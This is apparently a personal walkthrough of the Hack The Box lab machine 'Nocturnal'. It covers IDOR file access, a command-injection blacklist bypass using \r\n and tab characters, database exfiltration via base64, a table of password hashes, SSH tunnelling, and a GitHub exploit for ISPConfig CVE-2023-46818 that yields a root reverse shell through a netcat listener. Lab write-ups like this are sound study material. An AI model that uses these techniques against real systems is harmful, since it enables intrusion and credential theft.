- - - 
created : 13-08-2025 

Tags : #easy 

Released on 12 Apr 2025 (Season 8)
- - - 
# Objective

`Nocturnal` is a medium-difficulty Linux machine demonstrating an IDOR vulnerability in a PHP web application, allowing access to other users; uploaded files. Credentials are retrieved to log in to the admin panel, where the application&amp;#039;s source code is accessed. A command injection vulnerability is identified, providing a reverse shell as the `www-data` user. Password hashes are extracted from a SQLite database and cracked to obtain SSH access as the `tobias` user. Exploiting [CVE-2023-46818](https://nvd.nist.gov/vuln/detail/CVE-2023-46818) in the `ISPConfig` application grants remote command execution, leading to privilege escalation to the `root` user.
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Nocturnal]
└─$ rustscan -a nocturnal.htb -- -A 

Open 10.10.11.64:22
Open 10.10.11.64:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to Nocturnal
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)

Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)

Uptime guess: 14.116 days (since Wed Jul 30 12:15:56 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   70.30 ms 10.10.14.1
2   70.39 ms nocturnal.htb (10.10.11.64)
```
# Enumeration
## HTTP (80)

Main page :
![Pasted image 20250813150621.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250813150621.png)
### Gobuster

We can use [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Nocturnal]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://nocturnal.htb -t 50

/uploads              (Status: 403) [Size: 162]
/backups              (Status: 301) [Size: 178] [--> http://nocturnal.htb/backups/]
/uploads2             (Status: 403) [Size: 162]
```

Nothing interesting.
# Exploit

We can register and get access :

![Pasted image 20250813151031.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250813151031.png)

![Pasted image 20250813151109.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250813151109.png)

So the filename is sanitized by the code.
## Caido
### User Enumeration

Inspecting the request and response with [Caido](../../../3%20-%20Tags/Hacking%20Tools/Caido.md) we can try to enumerate existing users with the following request query :

```bash
GET /view.php?username=test&file=sample.pdf 
```

Now we send it to automate and fuzz the username parameter :

![Pasted image 20250813160548.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250813160548.png)

And we filter the results for length :

![Pasted image 20250813162313.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250813162313.png)

We have admin, doctor, tobias, amanda, test22, dupa and majid users.
![Pasted image 20250813162953.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250813162953.png)

Output from the user [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) reveal that it is vulnerable to insecure direct object reference [IDOR](../../../3%20-%20Tags/Hacking%20Concepts/IDOR.md) whereby when visiting each users will reveal what files that available for user to download.
### Admin Panel Access

We download `amanda` file and find her password in it : **{{REDACTED_PASSWD}}** 

```
http://nocturnal.htb/view.php?username=amanda&file=privacy.odt
```

Now we can login on the [Website](../../../3%20-%20Tags/Hacking%20Concepts/Website.md) with these credentials and we can access the admin panel and see the admin.php content :

![Pasted image 20250813164047.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250813164047.png)

there is some minimal blacklists that is implement to avoid user from doing the command injection. It is because from user input the `password` would be directly pass in the command as part of one full command to make a backup zip files. But this can be easily bypass with `\r\n` where this will be the point to split the command to execute another one and `\t` as substitue to space that has been blacklists.

When exploring through the directory, it is reveal that there is another interesting file called `./nocturnal_database/nocturnal_database.db` which exposed all the users and password hashes through encoded the file to [Base64](../../../3%20-%20Tags/Hacking%20Concepts/Base64.md) to exfiltrate the database. On all of the four password hashes, only tobias and kavi are able to be decrypted which lead to just tobias can make connection through [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) with the credentials.

| User   | Password                         | Decrypted           |
| ------ | -------------------------------- | ------------------- |
| admin  | d725aeba143f575736b07e045d8ceebb | N/A                 |
| amanda | df8b20aa0c935023f99ea58358fb63c4 | N/A                 |
| tobias | 55c82b1ccd55ab219b3b109b07d5061d | {{REDACTED_PASSWD}} |
| kavi   | f38cde1654b39fea2bd4f72f1ae4cdda | {{REDACTED_PASSWD}} |
| e0Al5  | 101ad4543a96a7fd84908fd0d802e7db | N/A                 |

We can retrieve the first flag :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Nocturnal]
└─$ ssh tobias@nocturnal.htb                  

tobias@nocturnal:~$ cat user.txt 
 {{REDACTED_FLAG}
```
# Privilege Escalation

We can't run `sudo`, checking network statistics shows the open port at `127.0.0.1:8080` that are run locally which may link to the `ispconfig` in /var/www folder :

```bash
tobias@nocturnal:/var/www$ ls
html  ispconfig  nocturnal_database  nocturnal.htb  php-fcgi-scripts

tobias@nocturnal:/var/www$ cat ispconfig
cat: ispconfig: Permission denied

tobias@nocturnal:/var/www$ netstat -tunl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
```

We can access the web `ispconfig` with port forwarding on [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :

```
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Nocturnal]
└─$ ssh -L 8080:127.0.0.1:8080 tobias@nocturnal.htb -N

tobias@nocturnal.htb's password: 

```

![Pasted image 20250813175816.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250813175816.png)

Using the password from tobias and username as `admin` we can login into the ispconfig :

![Pasted image 20250813180044.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250813180044.png)

Found that the version currently running is `3.2.10p1` 
## Exploit (PHP Code Injection)

We can find the [Exploit](../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) on [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md) :

![Pasted image 20250813180253.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250813180253.png)

Install dependencies:

```
pip install requests
pip install bs4
pip install base64
```

Now we change the **exploit.py** code to match our system and open a [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener on the same port inserted, then we can execute the following command :

```bash
┌──(.venv)─(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Nocturnal]
└─$ python3 exploit.py 
/home/mdn0x/HTB/Machines/Nocturnal/exploit.py:89: SyntaxWarning: invalid escape sequence '\]'
  exploit = session.post(url+"/admin/language_edit.php", data={"lang": "en", "lang_file": "en_language_edit.lng", "module": "admin", "_csrf_id": csrf_id['value'], "_csrf_key": csrf_key['value'],"records[\]": payload})
[+] Login Success
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Nocturnal]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.174] from (UNKNOWN) [10.10.11.64] 51728
bash: cannot set terminal process group (816): Inappropriate ioctl for device
bash: no job control in this shell
root@nocturnal:/usr/local/ispconfig/interface/web/admin# cd --
cd --
root@nocturnal:~# ls
ls
root.txt
scripts
root@nocturnal:~# cat roo
cat root.txt 
 {{REDACTED_FLAG}
```

Pwned !!
